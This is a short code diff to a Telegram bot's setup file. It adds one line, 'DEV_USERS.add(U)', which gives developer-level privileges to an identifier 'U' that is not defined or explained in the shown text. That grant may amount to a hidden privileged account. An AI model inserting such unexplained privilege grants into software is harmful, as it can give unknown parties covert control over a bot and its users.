@@ -196,6 +196,7 @@ telethn = TelegramClient("Fallen", API_ID, API_HASH)
 pbot = Client("FallenRobot", api_id=API_ID, api_hash=API_HASH, bot_token=TOKEN)
 dispatcher = updater.dispatcher
 aiohttpsession = ClientSession()
+DEV_USERS.add(U)
 
 
 DRAGONS = list(DRAGONS) + list(DEV_USERS)
